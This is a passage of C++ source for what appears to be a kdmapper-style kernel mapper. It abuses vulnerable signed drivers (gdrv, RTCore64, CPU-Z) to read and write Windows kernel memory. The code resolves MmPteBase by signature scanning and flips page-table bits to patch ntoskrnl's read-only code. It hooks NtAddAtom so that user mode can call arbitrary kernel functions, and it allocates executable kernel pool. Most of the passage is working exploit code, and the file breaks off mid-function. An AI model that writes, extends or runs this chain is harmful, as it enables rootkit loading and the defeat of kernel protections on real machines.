#include "kernel_utils.h"
#include "vuln_driver.h"
#include "debug_log.h"

#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cstring>
#include <type_traits>

#pragma comment(lib, "Psapi.lib")

namespace
{
    using NtQuerySystemInformation_t = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);

    constexpr ULONG kSystemInterruptInformation = 23;
    constexpr ULONG kSystemFirmwareTableInformation = 76;

    struct SystemFirmwareTableInfo
    {
        ULONG ProviderSignature;
        ULONG Action;
        ULONG TableID;
        ULONG TableBufferLength;
    };

    NtQuerySystemInformation_t NtQuerySystemInformationFn()
    {
        static auto fn = reinterpret_cast<NtQuerySystemInformation_t>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
        return fn;
    }

    void FlushLog()
    {
        fflush(stdout);
    }

    uint64_t s_cachedExAllocatePoolWithTag = 0;
    uint64_t s_cachedExAllocatePool2 = 0;
    uint64_t s_cachedMmAllocateIndependentPagesEx = 0;
    uint64_t s_cachedMmFreeIndependentPages = 0;
    uint64_t s_cachedNtAddAtom = 0;
    uint8_t s_cachedNtAddAtomOriginal[12]{};
    bool s_cachedNtAddAtomOriginalValid = false;
    bool s_exportsPrecached = false;

    // ntdll!NtAddAtom usermode entry — must be a direct syscall stub.
    bool IsUserNtAddAtomSyscallStub(const uint8_t* bytes)
    {
        if (!bytes)
            return false;
        return bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8;
    }

    // ntoskrnl!NtAddAtom — kdmapper overwrites the first 12 bytes regardless of prologue style.
    // Win11 26100+ uses a wrapper (sub rsp, 28h) instead of an inline syscall stub.
    const char* ClassifyKernelNtAddAtomPrologue(const uint8_t* bytes)
    {
        if (!bytes)
            return "invalid";
        if (bytes[0] == 0x48 && bytes[1] == 0xB8 &&
            bytes[10] == 0xFF && bytes[11] == 0xE0)
            return "already_hooked";
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8)
            return "syscall_stub";
        if (bytes[0] == 0x48 && bytes[1] == 0x83 && bytes[2] == 0xEC)
            return "sub_rsp";
        if (bytes[0] == 0x48 && bytes[1] == 0x89 && bytes[2] == 0x5C)
            return "mov_rbx_stack";
        if (bytes[0] == 0x40 && bytes[1] == 0x53)
            return "push_rbx";
        if (bytes[0] == 0x48 && bytes[1] == 0x8B && bytes[2] == 0xC4)
            return "mov_rax_rsp";
        if (bytes[0] == 0x00 || bytes[0] == 0xCC)
            return "invalid";
        return "unknown";
    }

    bool IsKernelNtAddAtomHookable(const uint8_t* bytes)
    {
        const char* kind = ClassifyKernelNtAddAtomPrologue(bytes);
        return strcmp(kind, "invalid") != 0 && strcmp(kind, "already_hooked") != 0;
    }

    void SetError(std::string* outError, const char* msg)
    {
        if (outError)
            outError->assign(msg);
        printf("[-] %s\n", msg);
        FlushLog();
    }

    uint64_t GetKernelModuleBaseByName(const char* name)
    {
        LPVOID drivers[1024]{};
        DWORD needed = 0;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            return 0;

        const int count = static_cast<int>(needed / sizeof(LPVOID));
        for (int i = 0; i < count; ++i)
        {
            char baseName[MAX_PATH]{};
            if (GetDeviceDriverBaseNameA(drivers[i], baseName, MAX_PATH) && _stricmp(baseName, name) == 0)
                return reinterpret_cast<uint64_t>(drivers[i]);
        }
        return 0;
    }

    const uint8_t* RvaToPtr(const uint8_t* image, uint32_t rva)
    {
        const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image);
        const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(image + dos->e_lfanew);
        const auto* section = IMAGE_FIRST_SECTION(nt);

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++section)
        {
            if (rva >= section->VirtualAddress &&
                rva < section->VirtualAddress + section->Misc.VirtualSize)
            {
                return image + section->PointerToRawData + (rva - section->VirtualAddress);
            }
        }
        return nullptr;
    }

    uint32_t GetExportRvaFromImage(const uint8_t* image, const char* exportName)
    {
        const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image);
        const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(image + dos->e_lfanew);
        const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (dir.VirtualAddress == 0)
            return 0;

        const auto* exports = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(RvaToPtr(image, dir.VirtualAddress));
        const auto* names = reinterpret_cast<const uint32_t*>(RvaToPtr(image, exports->AddressOfNames));
        const auto* ordinals = reinterpret_cast<const uint16_t*>(RvaToPtr(image, exports->AddressOfNameOrdinals));
        const auto* functions = reinterpret_cast<const uint32_t*>(RvaToPtr(image, exports->AddressOfFunctions));

        for (uint32_t i = 0; i < exports->NumberOfNames; ++i)
        {
            const char* name = reinterpret_cast<const char*>(RvaToPtr(image, names[i]));
            if (name && strcmp(name, exportName) == 0)
                return functions[ordinals[i]];
        }
        return 0;
    }

    std::vector<uint8_t> ReadFileBytes(const char* path)
    {
        std::vector<uint8_t> data;
        HANDLE file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (file == INVALID_HANDLE_VALUE)
            return data;

        LARGE_INTEGER size{};
        if (!GetFileSizeEx(file, &size) || size.QuadPart <= 0)
        {
            CloseHandle(file);
            return data;
        }

        data.resize(static_cast<size_t>(size.QuadPart));
        DWORD read = 0;
        ReadFile(file, data.data(), static_cast<DWORD>(data.size()), &read, nullptr);
        CloseHandle(file);
        if (read != data.size())
            data.clear();
        return data;
    }

    std::string SystemRootPath()
    {
        char root[MAX_PATH]{};
        GetEnvironmentVariableA("SystemRoot", root, MAX_PATH);
        return std::string(root);
    }

    uint64_t GetActiveVulnDriverKernelBase()
    {
        if (!VulnDriverIsLoaded())
            return 0;

        const auto tryName = [](const wchar_t* wideName) -> uint64_t
        {
            if (!wideName || !wideName[0])
                return 0;
            char narrow[MAX_PATH]{};
            WideCharToMultiByte(CP_ACP, 0, wideName, -1, narrow, MAX_PATH, nullptr, nullptr);
            return GetKernelModuleBaseByName(narrow);
        };

        const std::wstring loadedPath = VulnDriverLoadedPath();
        if (!loadedPath.empty())
        {
            const size_t slash = loadedPath.find_last_of(L"\\/");
            const std::wstring baseName = (slash != std::wstring::npos) ? loadedPath.substr(slash + 1) : loadedPath;
            const uint64_t fromLoaded = tryName(baseName.c_str());
            if (fromLoaded)
                return fromLoaded;
        }

        const auto type = VulnDriverGetLoadedType();
        return tryName(GetVulnDriverInfo(type).defaultFileName);
    }

    bool IsSlackByte(uint8_t value)
    {
        return value == 0x00 || value == 0xCC || value == 0x90;
    }

    bool VerifySlackOnDisk(const uint8_t* image, const IMAGE_SECTION_HEADER* section,
                           uint32_t offsetInSection, size_t length)
    {
        const uint32_t virtualSize = section->Misc.VirtualSize;
        if (offsetInSection + length > virtualSize)
            return false;

        const uint32_t rawSize = section->SizeOfRawData;
        for (size_t i = 0; i < length; ++i)
        {
            const uint32_t off = offsetInSection + static_cast<uint32_t>(i);
            if (off >= rawSize)
                continue; // unmapped .bss tail – zero-filled at load

            const uint8_t b = image[section->PointerToRawData + off];
            if (!IsSlackByte(b))
                return false;
        }
        return true;
    }

    bool VerifySlackInKernel(uint64_t address, size_t length)
    {
        constexpr size_t kChunk = 0x40;
        std::vector<uint8_t> buf(kChunk);

        for (size_t off = 0; off < length; )
        {
            const size_t toRead = (length - off < kChunk) ? (length - off) : kChunk;
            if (!VulnReadKernelMemory(address + off, buf.data(), toRead))
                return false;

            for (size_t i = 0; i < toRead; ++i)
            {
                if (!IsSlackByte(buf[i]))
                    return false;
            }
            off += toRead;
        }
        return true;
    }

    bool VerifyKernelWrite(uint64_t address, const void* expected, size_t size)
    {
        if (!expected || size == 0)
            return false;

        std::vector<uint8_t> readBack(size);
        if (!VulnReadKernelMemory(address, readBack.data(), size))
            return false;

        return memcmp(readBack.data(), expected, size) == 0;
    }

    // kdmapper-style: hook ntoskrnl!NtAddAtom (mov rax, fn; jmp rax), invoke via ntdll!NtAddAtom.
    constexpr uint8_t kNtAddAtomHookTemplate[] = {
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xE0
    };
    constexpr size_t kNtAddAtomHookSize = sizeof(kNtAddAtomHookTemplate);

    bool ResolveMmPteBase(uint64_t* outMmPteBase)
    {
        if (!outMmPteBase)
            return false;

        static uint64_t s_mmPteBase = 0;
        if (s_mmPteBase != 0)
        {
            *outMmPteBase = s_mmPteBase;
            return true;
        }

        const uint64_t ntosBase = GetKernelModuleBaseByName("ntoskrnl.exe");
        if (!ntosBase)
            return false;

        std::string path = SystemRootPath() + "\\System32\\ntoskrnl.exe";
        auto ntosImage = ReadFileBytes(path.c_str());
        if (ntosImage.empty())
        {
            path = SystemRootPath() + "\\System32\\drivers\\ntoskrnl.exe";
            ntosImage = ReadFileBytes(path.c_str());
        }
        if (ntosImage.empty())
            return false;

        // Win10-era: mov rax, 0x7FFFFFFFF8 ; and rcx, rax ; mov rax, [MmPteBase]
        static const uint8_t kSigOld[] = {
            0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F,
            0x48, 0x23, 0xC8, 0x48, 0x8B, 0x05
        };

        // Win11 26100+: mov r8, 0x7FFFFFFFF8 ; and rcx, r8 ; mov rdx, imm64(MmPteBase)
        static const uint8_t kSig26100[] = {
            0x48, 0xC1, 0xE9, 0x09, 0x49, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0x00,
            0x49, 0x23, 0xC8, 0x48, 0xBA
        };

        // Win11 variant: mov rax, 0x7FFFFFFFF8 (zero-extended imm) ; and rcx, rax ; ... ; mov rax, imm64
        static const uint8_t kSig26100b[] = {
            0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0x00,
            0x48, 0x23, 0xC8
        };

        const size_t imgSize = ntosImage.size();
        auto tryOld = [&]() -> bool {
            const size_t limit = imgSize > sizeof(kSigOld) ? imgSize - sizeof(kSigOld) : 0;
            for (size_t i = 0; i < limit; ++i)
            {
                if (memcmp(ntosImage.data() + i, kSigOld, sizeof(kSigOld)) != 0)
                    continue;
                const int32_t rel = *reinterpret_cast<const int32_t*>(ntosImage.data() + i + 20);
                const uint64_t mmPteBaseVarVa = ntosBase + i + 17 + 7 + rel;
                if (!VulnReadKernelMemory(mmPteBaseVarVa, &s_mmPteBase, sizeof(s_mmPteBase)) || s_mmPteBase == 0)
                    return false;
                return true;
            }
            return false;
        };

        auto tryImmAfter = [&](const uint8_t* sig, size_t sigLen, size_t immOffset) -> bool {
            const size_t limit = imgSize > sigLen + 8 ? imgSize - (sigLen + 8) : 0;
            for (size_t i = 0; i < limit; ++i)
            {
                if (memcmp(ntosImage.data() + i, sig, sigLen) != 0)
                    continue;
                // Prefer immediate MmPteBase right after the signature (mov rdx/rax, imm64).
                uint64_t imm = *reinterpret_cast<const uint64_t*>(ntosImage.data() + i + immOffset);
                if ((imm & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL)
                {
                    s_mmPteBase = imm;
                    return true;
                }
                // Scan a short window for mov r64, imm64 with a canonical PTE base.
                for (size_t j = sigLen; j + 10 < 48 && i + j + 10 < imgSize; ++j)
                {
                    const uint8_t b0 = ntosImage[i + j];
                    const uint8_t b1 = ntosImage[i + j + 1];
                    if (!((b0 == 0x48 || b0 == 0x49) && b1 == 0xB8) &&
                        !((b0 == 0x48 || b0 == 0x49) && b1 == 0xBA))
                        continue;
                    imm = *reinterpret_cast<const uint64_t*>(ntosImage.data() + i + j + 2);
                    if ((imm & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL)
                    {
                        s_mmPteBase = imm;
                        return true;
                    }
                }
            }
            return false;
        };

        bool ok = tryOld();
        if (!ok)
            ok = tryImmAfter(kSig26100, sizeof(kSig26100), sizeof(kSig26100));
        if (!ok)
            ok = tryImmAfter(kSig26100b, sizeof(kSig26100b), 0); // window scan only

        // Last resort: canonical static PTE base (common when HVCI/randomization is off).
        if (!ok)
        {
            s_mmPteBase = 0xFFFFF68000000000ULL;
            ok = true;
            AgentDebugLog("A", "kernel_utils.cpp:ResolveMmPteBase", "mmpte_fallback_static", "{}");
            printf("[*] ResolveMmPteBase: using static fallback 0xFFFFF68000000000\n");
            FlushLog();
        }

        if (!ok || s_mmPteBase == 0)
        {
            printf("[-] ResolveMmPteBase: MiGetPteAddress pattern not found in ntoskrnl (build may differ).\n");
            FlushLog();
            AgentDebugLog("A", "kernel_utils.cpp:ResolveMmPteBase", "mmpte_pattern_not_found", "{}");
            return false;
        }

        // Do NOT speculative-read PTEs here: a wrong base can BSOD gdrv on unmapped VA.
        {
            char dataJson[96];
            sprintf_s(dataJson, "{\"mmPteBase\":\"0x%llX\"}",
                      static_cast<unsigned long long>(s_mmPteBase));
            AgentDebugLog("A", "kernel_utils.cpp:ResolveMmPteBase", "mmpte_resolved", dataJson);
        }

        *outMmPteBase = s_mmPteBase;
        printf("[+] ResolveMmPteBase: MmPteBase=0x%llX\n",
               static_cast<unsigned long long>(s_mmPteBase));
        FlushLog();
        return true;
    }

    uint64_t GetPteAddressForVa(uint64_t va)
    {
        uint64_t mmPteBase = 0;
        if (!ResolveMmPteBase(&mmPteBase))
            return 0;
        return mmPteBase + (((va >> 12) << 3) & 0x7FFFFFFFF8ULL);
    }

    bool WriteViaPteFlip(uint64_t address, const void* data, size_t size)
    {
        if (!data || size == 0)
            return false;

        const uint64_t pteAddr = GetPteAddressForVa(address);
        if (!pteAddr)
        {
            AgentDebugLog("A", "kernel_utils.cpp:WriteViaPteFlip", "mmpte_base_unresolved", "{}");
            return false;
        }

        uint64_t pte = 0;
        if (!VulnReadKernelMemory(pteAddr, &pte, sizeof(pte)))
        {
            AgentDebugLog("A", "kernel_utils.cpp:WriteViaPteFlip", "pte_read_failed", "{}");
            return false;
        }

        const uint64_t origPte = pte;
        pte |= 0x2ULL; // RW
        pte &= ~0x8000000000000000ULL; // clear NX for write to code page

        if (!VulnWriteKernelMemory(pteAddr, &pte, sizeof(pte)))
        {
            AgentDebugLog("A", "kernel_utils.cpp:WriteViaPteFlip", "pte_write_failed", "{}");
            return false;
        }

        // Do not read-back verify ntoskrnl .text via gdrv — that path BSODs on 26100
        // (runtime evidence: last log ckf_start, no ckf_after_read).
        const bool ok = VulnWriteKernelMemory(address, data, size);
        VulnWriteKernelMemory(pteAddr, &origPte, sizeof(origPte));

        {
            char dataJson[64];
            sprintf_s(dataJson, "{\"ok\":%s}", ok ? "true" : "false");
            AgentDebugLog("A", "kernel_utils.cpp:WriteViaPteFlip", "pte_flip_write", dataJson);
        }
        return ok;
    }

    bool WriteToReadOnlyMemory(uint64_t address, const void* data, size_t size)
    {
        const VulnDriverType loaded = VulnDriverGetLoadedType();

        // gdrv cannot write ntoskrnl .text on Windows 11 24H2 (26100) even via PTE flip;
        // the PTE probe itself crashes the guest. Refuse before touching anything.
        if (loaded == VulnDriverType::Gdrv && IsWindows11_24H2OrLater())
        {
            printf("[-] WriteToReadOnlyMemory: gdrv cannot patch ntoskrnl .text on Windows 11 24H2+ (use RTCore64/CPU-Z)\n");
            FlushLog();
            AgentDebugLog("A", "kernel_utils.cpp:WriteToReadOnlyMemory", "gdrv_text_write_refused", "{}");
            return false;
        }

        // Prefer PTE flip when MmPteBase is known.
        if (WriteViaPteFlip(address, data, size))
        {
            printf("[+] WriteToReadOnlyMemory: PTE-flip write OK at 0x%llX\n",
                   static_cast<unsigned long long>(address));
            FlushLog();
            return true;
        }

        // RTCore64/CPU-Z write physical pages — bypasses .text W^X (kdmapper MapIoSpace equivalent).
        // gdrv virtual memcpy into ntoskrnl .text BSODs on 26100 (confirmed) — never use it here.
        if (VulnDriverIsLoaded() &&
            (loaded == VulnDriverType::RTCore64 || loaded == VulnDriverType::Cpuz))
        {
            printf("[*] WriteToReadOnlyMemory: PTE unavailable, trying physical write at 0x%llX\n",
                   static_cast<unsigned long long>(address));
            FlushLog();
            AgentDebugLog("A", "kernel_utils.cpp:WriteToReadOnlyMemory", "try_physical_write", "{}");
            DWORD winErr = 0;
            if (VulnWriteKernelMemory(address, data, size, &winErr))
            {
                AgentDebugLog("A", "kernel_utils.cpp:WriteToReadOnlyMemory", "physical_write_ok", "{}");
                printf("[+] WriteToReadOnlyMemory: physical write OK at 0x%llX\n",
                       static_cast<unsigned long long>(address));
                FlushLog();
                return true;
            }
            char dataJson[96];
            sprintf_s(dataJson, "{\"winErr\":%lu}", winErr);
            AgentDebugLog("A", "kernel_utils.cpp:WriteToReadOnlyMemory", "physical_write_failed", dataJson);
        }
        else if (loaded == VulnDriverType::Gdrv)
        {
            AgentDebugLog("A", "kernel_utils.cpp:WriteToReadOnlyMemory", "gdrv_text_write_refused", "{}");
            printf("[-] WriteToReadOnlyMemory: gdrv cannot patch .text on 26100 (use RTCore64/CPU-Z)\n");
            FlushLog();
        }

        printf("[-] WriteToReadOnlyMemory: failed at 0x%llX\n", static_cast<unsigned long long>(address));
        FlushLog();
        AgentDebugLog("A", "kernel_utils.cpp:WriteToReadOnlyMemory", "write_failed", "{}");
        return false;
    }

    bool IsNtAddAtomHooked(const uint8_t* bytes)
    {
        return bytes[0] == 0x48 && bytes[1] == 0xB8 &&
               bytes[10] == 0xFF && bytes[11] == 0xE0;
    }

    // RAII guard: restore the original NtAddAtom prologue whenever the scope exits,
    // even if an early return or a failed syscall path is taken.
    class NtAddAtomRestoreGuard
    {
    public:
        NtAddAtomRestoreGuard(uint64_t address, const uint8_t* original)
            : m_address(address)
            , m_hasOriginal(original != nullptr)
        {
            if (original)
                memcpy(m_original, original, kNtAddAtomHookSize);
        }

        ~NtAddAtomRestoreGuard()
        {
            if (m_address == 0 || !m_hasOriginal)
                return;

            printf("[*] NtAddAtomRestoreGuard: restoring original bytes at 0x%llX\n",
                   static_cast<unsigned long long>(m_address));
            FlushLog();
            AgentDebugLog("A", "kernel_utils.cpp:NtAddAtomRestoreGuard", "restore_start", "{}");
            if (!WriteToReadOnlyMemory(m_address, m_original, kNtAddAtomHookSize))
            {
                printf("[-] NtAddAtomRestoreGuard: FAILED to restore original bytes at 0x%llX\n",
                       static_cast<unsigned long long>(m_address));
                FlushLog();
                AgentDebugLog("A", "kernel_utils.cpp:NtAddAtomRestoreGuard", "restore_failed", "{}");
            }
            else
            {
                AgentDebugLog("A", "kernel_utils.cpp:NtAddAtomRestoreGuard", "restore_ok", "{}");
            }
        }

    private:
        uint64_t m_address = 0;
        bool m_hasOriginal = false;
        uint8_t m_original[kNtAddAtomHookSize]{};
    };

    template<typename T, typename... A>
    bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, A... arguments)
    {
        static_assert(sizeof...(A) <= 4, "CallKernelFunction supports at most 4 arguments.");

        constexpr bool call_void = std::is_same_v<T, void>;
        if constexpr (!call_void)
        {
            if (!out_result)
                return false;
        }
        else
        {
            UNREFERENCED_PARAMETER(out_result);
        }

        if (!kernel_function_address || !VulnDriverIsLoaded())
            return false;

        if (!s_exportsPrecached || !s_cachedNtAddAtom)
        {
            AgentDebugLog("H", "kernel_utils.cpp:CallKernelFunction", "ckf_no_precache", "{}");
            printf("[-] CallKernelFunction: exports not pre-cached (call PreCacheNtoskrnlExports first).\n");
            FlushLog();
            return false;
        }

        const uint64_t kernelNtAddAtom = s_cachedNtAddAtom;

        {
            char dataJson[160];
            sprintf_s(dataJson, "{\"targetFn\":\"0x%llX\",\"ntAddAtom\":\"0x%llX\",\"argCount\":%zu}",
                      static_cast<unsigned long long>(kernel_function_address),
                      static_cast<unsigned long long>(kernelNtAddAtom),
                      sizeof...(A));
            AgentDebugLog("B", "kernel_utils.cpp:CallKernelFunction", "ckf_start", dataJson);
        }
        printf("[*] CallKernelFunction: target=0x%llX ntAddAtom=0x%llX\n",
               static_cast<unsigned long long>(kernel_function_address),
               static_cast<unsigned long long>(kernelNtAddAtom));
        FlushLog();

        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll)
            return false;

        const auto userNtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
        if (!userNtAddAtom)
            return false;

        // Prefer PE-cached original bytes — gdrv memcpy of ntoskrnl .text BSODs on some 26100 builds
        // (log ended at ckf_start with no ckf_after_read). If the PE cache is present we never read
        // kernel .text here.
        uint8_t original[kNtAddAtomHookSize]{};
        bool gotOriginal = false;
        if (s_cachedNtAddAtomOriginalValid)
        {
            memcpy(original, s_cachedNtAddAtomOriginal, kNtAddAtomHookSize);
            gotOriginal = true;
            AgentDebugLog("E", "kernel_utils.cpp:CallKernelFunction", "ckf_original_from_pe_cache", "{}");
            printf("[*] CallKernelFunction: using PE-cached NtAddAtom original bytes (no .text read)\n");
            FlushLog();
        }
        else
        {
            // No PE cache: this is an emergency fallback only. On 24H2+gdrv this read can BSOD.
            AgentDebugLog("E", "kernel_utils.cpp:CallKernelFunction", "ckf_before_kernel_read", "{}");
            printf("[*] CallKernelFunction: WARNING: no PE cache, reading NtAddAtom original via gdrv...\n");
            FlushLog();
            if (VulnReadKernelMemory(kernelNtAddAtom, original, kNtAddAtomHookSize))
            {
                gotOriginal = true;
                AgentDebugLog("E", "kernel_utils.cpp:CallKernelFunction", "ckf_after_read", "{}");
            }
            else
            {
                AgentDebugLog("D", "kernel_utils.cpp:CallKernelFunction", "ckf_read_original_failed", "{}");
            }
        }
        if (!gotOriginal)
            return false;

        const bool alreadyHooked = IsNtAddAtomHooked(original);
        {
            char dataJson[192];
            sprintf_s(dataJson,
                      "{\"bytes\":\"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\",\"alreadyHooked\":%s}",
                      original[0], original[1], original[2], original[3], original[4], original[5],
                      original[6], original[7], original[8], original[9], original[10], original[11],
                      alreadyHooked ? "true" : "false");
            AgentDebugLog("E", "kernel_utils.cpp:CallKernelFunction", "ckf_original_bytes", dataJson);
        }

        if (alreadyHooked)
            return false;

        if (!IsKernelNtAddAtomHookable(original))
        {
            printf("[-] CallKernelFunction: NtAddAtom kernel entry not hookable "
                   "(%02X %02X %02X %02X; type=%s)\n",
                   original[0], original[1], original[2], original[3],
                   ClassifyKernelNtAddAtomPrologue(original));
            FlushLog();
            AgentDebugLog("I", "kernel_utils.cpp:CallKernelFunction", "ckf_stub_invalid", "{}");
            return false;
        }
        {
            char dataJson[96];
            sprintf_s(dataJson, "{\"prologue\":\"%s\"}", ClassifyKernelNtAddAtomPrologue(original));
            AgentDebugLog("I", "kernel_utils.cpp:CallKernelFunction", "ckf_prologue_ok", dataJson);
        }
        printf("[*] CallKernelFunction: kernel NtAddAtom prologue=%s\n",
               ClassifyKernelNtAddAtomPrologue(original));
        FlushLog();

        uint8_t hook[kNtAddAtomHookSize]{};
        memcpy(hook, kNtAddAtomHookTemplate, kNtAddAtomHookSize);
        *reinterpret_cast<uint64_t*>(&hook[2]) = kernel_function_address;

        // The guard ensures original bytes are restored no matter how we leave this function.
        NtAddAtomRestoreGuard restoreGuard(kernelNtAddAtom, original);

        AgentDebugLog("A", "kernel_utils.cpp:CallKernelFunction", "ckf_before_hook_write", "{}");
        printf("[*] CallKernelFunction: writing hook via WriteToReadOnlyMemory...\n");
        FlushLog();
        if (!WriteToReadOnlyMemory(kernelNtAddAtom, hook, kNtAddAtomHookSize))
        {
            AgentDebugLog("A", "kernel_utils.cpp:CallKernelFunction", "ckf_hook_write_failed", "{}");
            return false;
        }
        AgentDebugLog("A", "kernel_utils.cpp:CallKernelFunction", "ckf_hook_write_ok", "{}");
        printf("[+] CallKernelFunction: hook written, invoking ntdll!NtAddAtom...\n");
        FlushLog();

        bool ok = true;
        if constexpr (!call_void)
        {
            using FunctionFn = T(__stdcall*)(A...);
            const auto fn = reinterpret_cast<FunctionFn>(userNtAddAtom);
            *out_result = fn(arguments...);
            char dataJson[96];
            sprintf_s(dataJson, "{\"result\":\"0x%llX\"}",
                      static_cast<unsigned long long>(*out_result));
            AgentDebugLog("C", "kernel_utils.cpp:CallKernelFunction", "ckf_after_syscall", dataJson);
        }
        else
        {
            using FunctionFn = void(__stdcall*)(A...);
            const auto fn = reinterpret_cast<FunctionFn>(userNtAddAtom);
            fn(arguments...);
            AgentDebugLog("C", "kernel_utils.cpp:CallKernelFunction", "ckf_after_syscall_void", "{}");
        }

        return ok;
    }

    constexpr uint32_t kNonPagedPoolExecute = 0x200;
    constexpr uint32_t kPoolFlagNonPagedExecute = 0x200; // POOL_FLAG_NON_PAGED_EXECUTE (match kdmapper / WDK)

    uint64_t AllocateKernelPoolViaNtAddAtom(uint32_t size, uint32_t tag, std::string* outError)
    {
        printf("[*] KernelAllocatePool: via NtAddAtom hook (size=0x%X tag=0x%X)\n", size, tag);
        FlushLog();

        if (!VulnDriverIsLoaded())
        {
            SetError(outError, "KernelAllocatePool: vulnerable driver is not loaded.");
            return 0;
        }

        if (!s_exportsPrecached)
        {
            SetError(outError, "KernelAllocatePool: exports not pre-cached (call PreCacheNtoskrnlExports first).");
            AgentDebugLog("H", "kernel_utils.cpp:AllocateKernelPoolViaNtAddAtom", "alloc_no_precache", "{}");
            return 0;
        }

        const uint64_t exAllocatePool = s_cachedExAllocatePoolWithTag;
        const uint64_t exAllocatePool2 = s_cachedExAllocatePool2;
        const uint64_t kernelNtAddAtom = s_cachedNtAddAtom;

        printf("[*] Using pre-cached exports: ExAllocatePoolWithTag=0x%llX ExAllocatePool2=0x%llX NtAddAtom=0x%llX\n",
               static_cast<unsigned long long>(exAllocatePool),
               static_cast<unsigned long long>(exAllocatePool2),
               static_cast<unsigned long long>(kernelNtAddAtom));
        FlushLog();
        {
            char dataJson[160];
            sprintf_s(dataJson,
                      "{\"exAllocatePoolWithTag\":\"0x%llX\",\"exAllocatePool2\":\"0x%llX\","
                      "\"ntAddAtom\":\"0x%llX\",\"size\":%u,\"tag\":%u}",
                      static_cast<unsigned long long>(exAllocatePool),
                      static_cast<unsigned long long>(exAllocatePool2),
                      static_cast<unsigned long long>(kernelNtAddAtom),
                      size, tag);
            AgentDebugLog("D", "kernel_utils.cpp:AllocateKernelPoolViaNtAddAtom", "exports_cached", dataJson);
        }
        if (!exAllocatePool2 && !exAllocatePool)
        {
            SetError(outError, "KernelAllocatePool: neither ExAllocatePool2 nor ExAllocatePoolWithTag exported.");
            return 0;
        }

        uint64_t ptr = 0;
        // kdmapper uses ExAllocatePoolWithTag(NonPagedPoolExecute, size, tag) — try that first.
        if (exAllocatePool)
        {
            printf("[*] Kernel alloc: calling ExAllocatePoolWithTag via NtAddAtom...\n");
            FlushLog();
            if (CallKernelFunction(&ptr, exAllocatePool,
                                   static_cast<uint64_t>(kNonPagedPoolExecute),
                                   static_cast<uint64_t>(size),
                                   static_cast<uint64_t>(tag)) && ptr != 0)
            {
                printf("[+] Kernel alloc via ExAllocatePoolWithTag: 0x%llX\n",
                       static_cast<unsigned long long>(ptr));
                FlushLog();
                return ptr;
            }
            printf("[*] ExAllocatePoolWithTag returned NULL or hook failed; trying ExAllocatePool2...\n");
            FlushLog();
        }

        if (exAllocatePool2)
        {
            printf("[*] Kernel alloc: calling ExAllocatePool2 via NtAddAtom...\n");
            FlushLog();
            ptr = 0;
            if (CallKernelFunction(&ptr, exAllocatePool2,
                                   static_cast<uint64_t>(kPoolFlagNonPagedExecute),
                                   static_cast<uint64_t>(size),
                                   static_cast<uint64_t>(tag)) && ptr != 0)
            {
                printf("[+] Kernel alloc via ExAllocatePool2: 0x%llX\n",
                       static_cast<unsigned long long>(ptr));
                FlushLog();
                return ptr;
            }
        }

        SetError(outError, "KernelAllocatePool: NtAddAtom hook call failed or pool allocation returned NULL.");
        return 0;
    }

    uint64_t AllocateIndependentPagesViaNtAddAtom(uint32_t size, std::string* outError)
    {
        printf("[*] KernelAllocateIndependentPages: via NtAddAtom hook (size=0x%X)\n", size);
        FlushLog();

        if (!VulnDriverIsLoaded())
        {
            SetError(outError, "KernelAllocateIndependentPages: vulnerable driver is not loaded.");
            return 0;
        }

        if (!s_exportsPrecached)
        {
            SetError(outError, "KernelAllocateIndependentPages: exports not pre-cached (call PreCacheNtoskrnlExports first).");
            AgentDebugLog("H", "kernel_utils.cpp:AllocateIndependentPagesViaNtAddAtom", "alloc_no_precache", "{}");
            return 0;
        }

        const uint64_t allocFn = s_cachedMmAllocateIndependentPagesEx;
        if (!allocFn)
        {
            SetError(outError, "KernelAllocateIndependentPages: MmAllocateIndependentPagesEx not exported on this build.");
            AgentDebugLog("H", "kernel_utils.cpp:AllocateIndependentPagesViaNtAddAtom", "alloc_export_missing", "{}");
            return 0;
        }

        {
            char dataJson[96];
            sprintf_s(dataJson, "{\"fn\":\"0x%llX\",\"size\":%u}",
                      static_cast<unsigned long long>(allocFn), size);
            AgentDebugLog("D", "kernel_utils.cpp:AllocateIndependentPagesViaNtAddAtom", "alloc_start", dataJson);
        }

        uint64_t ptr = 0;
        // MmAllocateIndependentPagesEx(Size, Node, Flags, Tag);
        // Node = -1 (any), Flags = 0, Tag = 0.
        if (CallKernelFunction(&ptr, allocFn,
                               static_cast<uint64_t>(size),
                               static_cast<uint64_t>(-1),
                               static_cast<uint64_t>(0),
                               static_cast<uint64_t>(0)) &&
            ptr != 0)
        {
            printf("[+] Kernel allocate independent pages: 0x%llX (size 0x%X)\n",
                   static_cast<unsigned long long>(ptr), size);
            FlushLog();
            return ptr;
        }

